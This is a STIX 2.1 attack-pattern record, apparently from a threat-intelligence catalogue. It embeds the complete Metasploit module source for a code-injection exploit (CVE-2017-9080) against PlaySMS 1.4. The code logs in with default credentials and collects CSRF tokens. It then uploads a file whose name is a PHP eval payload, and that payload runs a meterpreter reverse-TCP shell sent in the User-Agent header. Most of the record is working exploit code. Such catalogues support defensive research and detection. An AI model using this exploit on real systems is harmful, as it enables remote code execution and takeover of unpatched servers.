{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b59337df-6cbb-463f-b111-acbc77c6e7e8",
    "created": "2024-08-14T17:10:23.560146Z",
    "modified": "2024-08-14T17:10:23.56015Z",
    "name": "PlaySMS sendfromfile.php Authenticated \"Filename\" Field Code Execution",
    "description": " This module exploits a code injection vulnerability within an authenticated file upload feature in PlaySMS v1.4. This issue is caused by improper file name handling in sendfromfile.php file. Authenticated Users can upload a file and rename the file with a malicious payload. This module was tested against PlaySMS 1.4 on VulnHub's Dina 1.0 machine and Windows 7. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/playsms_filename_exec.rb",
            "external_id": "playsms_filename_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'PlaySMS sendfromfile.php Authenticated \"Filename\" Field Code Execution',\n      'Description' => %q{\n          This module exploits a code injection vulnerability within an authenticated file\n          upload feature in PlaySMS v1.4. This issue is caused by improper file name handling\n          in sendfromfile.php file.\n          Authenticated Users can upload a file and rename the file with a malicious payload.\n          This module was tested against PlaySMS 1.4 on VulnHub's Dina 1.0 machine and Windows 7.\n      },\n      'Author' =>\n        [\n          'Touhid M.Shaikh <touhidshaikh22[at]gmail.com>', # Discoverys and Metasploit Module\n          'DarkS3curity' # Metasploit Module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['EDB','42003'],\n          ['CVE','2017-9080'],\n          ['URL','https://www.youtube.com/watch?v=MuYoImvfpew'],\n          ['URL','http://touhidshaikh.com/blog/?p=336']\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL'     => false,\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n          'ENCODER' => 'php/base64',\n        },\n      'Privileged' => false,\n      'Platform'   => ['php'],\n      'Arch'       => ARCH_PHP,\n      'Targets' =>\n        [\n          [ 'PlaySMS 1.4', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-05-21'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base playsms directory path\", '/']),\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", 'admin']),\n        OptString.new('PASSWORD', [ true, \"Password to authenticate with\", 'admin'])\n      ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(uri, 'index.php')\n      })\n    rescue\n      vprint_error('Unable to access the index.php file')\n      return CheckCode::Unknown\n    end\n\n    if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_auth&route=login')\n      return Exploit::CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def login\n    res = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'method' => 'GET',\n      'vars_get' => {\n        'app' => 'main',\n        'inc' => 'core_auth',\n        'route' => 'login',\n      }\n    })\n\n    # Grabbing CSRF token from body\n    /name=\"X-CSRF-Token\" value=\"(?<csrf>[a-z0-9\"]+)\">/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine CSRF token\") if csrf.nil?\n    vprint_good(\"X-CSRF-Token for login : #{csrf}\")\n\n    cookies = res.get_cookies\n    vprint_status('Trying to Login ......')\n    # Send Creds with cookies.\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'cookie' => cookies,\n      'vars_get' => Hash[{\n        'app' => 'main',\n        'inc' => 'core_auth',\n        'route' => 'login',\n        'op' => 'login',\n      }.to_a.shuffle],\n      'vars_post' => Hash[{\n        'X-CSRF-Token' => csrf,\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }.to_a.shuffle],\n    })\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to Login request\") if res.nil?\n\n    # Try to access index page with authenticated cookie.\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'cookie' => cookies,\n    })\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to Login request\") if res.nil?\n\n    # if we redirect to core_welcome dan we assume we have authenticated cookie.\n    if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_welcome')\n      print_good(\"Authentication successful : [ #{datastore['USERNAME']} : #{datastore['PASSWORD']} ]\")\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n      return cookies\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]\")\n    end\n  end\n\n  def exploit\n    cookies = login\n\n    # Agian CSRF token.\n    res = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'method' => 'GET',\n      'cookie' => cookies,\n      'vars_get' => Hash[{\n        'app' => 'main',\n        'inc' => 'feature_sendfromfile',\n        'op' => 'list',\n      }.to_a.shuffle]\n    })\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to Login request\") if res.nil?\n\n    # Grabbing CSRF token from body.\n    /name=\"X-CSRF-Token\" value=\"(?<csrf>[a-z0-9\"]+)\">/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine CSRF token\") if csrf.nil?\n    vprint_good(\"X-CSRF-Token for upload : #{csrf}\")\n\n    # Payload.\n    evilname = \"<?php $t=$_SERVER['HTTP_USER_AGENT']; eval($t); ?>\"\n\n    form_data = [\n      # CSRF token\n      { 'name' => 'X-CSRF-Token', 'data' => csrf },\n      # payload\n      { 'name' => 'fncsv', 'content_type' => 'application/octet-stream', 'data' => \"#{rand_text_alpha(8 + rand(5))}\", 'filename' => evilname },\n      # extra\n      { 'name' => 'fncsv_dup', 'data' => '1' }\n    ]\n\n    vprint_status('Trying to upload file with malicious Filename Field....')\n    # Lets Send Upload request.\n    res = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'method' => 'POST',\n      'agent' => payload.encode,\n      'cookie' => cookies,\n      'vars_get' => Hash[{\n        'app' => 'main',\n        'inc' => 'feature_sendfromfile',\n        'op' => 'upload_confirm',\n      }.to_a.shuffle],\n      'headers' => {\n        'Upgrade-Insecure-Requests' => '1',\n      },\n      'Connection' => 'close',\n      'vars_form_data' => form_data\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-21",
    "x_mitre_platforms": [
        "['php']"
    ]
}